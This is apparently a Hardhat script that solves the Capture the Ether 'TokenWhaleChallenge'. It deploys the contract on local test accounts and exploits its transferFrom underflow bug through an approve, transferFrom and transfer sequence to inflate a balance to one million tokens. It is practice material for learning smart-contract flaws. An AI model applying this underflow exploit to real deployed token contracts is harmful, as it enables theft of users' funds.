const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();
    const baseContractFactory = await hre.ethers.getContractFactory('TokenWhaleChallenge');
    const tokenWhaleContract = await baseContractFactory.connect(accounts[1]).deploy(accounts[2].address);
    // const telephoneContract = await hre.ethers.getContractAt('Telephone', "0xC6bA8C3233eCF65B761049ef63466945c362EdD2");
    //
    await tokenWhaleContract.deployed();
    console.log(tokenWhaleContract.address)

    await tokenWhaleContract.connect(accounts[2]).approve(accounts[3].address, 250);
    await tokenWhaleContract.connect(accounts[3]).transferFrom(accounts[2].address,accounts[4].address, 250);
    await tokenWhaleContract.connect(accounts[3]).transfer(accounts[2].address,1000000);
    console.log(await tokenWhaleContract.isComplete());


}


main();